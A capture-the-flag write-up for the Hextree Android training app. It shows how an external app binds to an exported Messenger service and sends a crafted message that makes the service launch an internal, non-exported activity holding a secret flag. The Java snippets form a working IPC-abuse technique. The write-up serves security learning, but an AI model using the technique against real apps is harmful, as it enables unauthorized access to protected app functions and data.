---
title: Exploiting Flag26Service – Android Messenger-Based Service (Hextree CTF)
description: Learn how to exploit a bound Messenger-based service in a CTF Android app to trigger an internal activity and capture the flag.
date: 2025-06-09
tags:
  - Android
  - IPC
  - Messenger
  - Android CTF
  - Hextree
  - Android Services
  - App Security
---
## Flag 26 – Basic Message Handler (Messenger-Based Service Exploitation)

### 🔍 Challenge Overview

We're given a bound `Service` called `Flag26Service`, which exposes a `Messenger` IPC interface using `onBind()`:

```java
@Override
public IBinder onBind(Intent intent) {
    return this.messenger.getBinder();
}
```

The service uses a `Handler` to process incoming messages. When it receives a message with `what == 42`, it triggers this function:

```java
private void success(String str) {
    Intent intent = new Intent(this, Flag26Activity.class);
    intent.putExtra("secret", secret);
    intent.putExtra("what", 42);
    intent.addFlags(268468224);
    intent.putExtra("hideIntent", true);
    startActivity(intent);
}
```

This launches the activity containing the flag, passing the secret and flag trigger values via the `Intent`.

---

### 🚧 The Catch

Even if you successfully bind to the service and send `Message.what == 42`, **`Flag26Activity` is not exported**:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag26Activity"
    android:exported="false"/>
```

This means the activity **cannot be launched** from your external app **unless the target app is already in the foreground or running in the background**.

---

### ✅ Solution Steps

1. **Create a separate app** (your attack app).
    
2. In it, bind to the exported `Flag26Service` using `Context.BIND_AUTO_CREATE`.
    
3. Once connected, send a `Message` with `what == 42` using `Messenger.send()`.
    

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
bindService(intent, connection, Context.BIND_AUTO_CREATE);
```

```java
Message msg = Message.obtain(null, 42);
serviceMessenger.send(msg);
```

4. Since `Flag26Activity` is not exported, the service **won’t launch it successfully unless the app is running**.
    
    ✅ **Workaround:**  
    After pressing the attack button, **manually open the target app** (`io.hextree.attacksurface`) to bring it to the foreground.  
    This will allow `startActivity(intent)` inside the service to succeed.
    

---

### 🏁 Flag Retrieval

Once the activity is launched, it checks if the passed `secret` matches the static `Flag26Service.secret`, and shows the flag if so:

```java
if (Flag26Service.secret.equals(stringExtra)) {
    success(this);
}
```

✅ **Flag is displayed inside `Flag26Activity` UI or logged using the internal `LogHelper` class**.
thanks for reading.

---
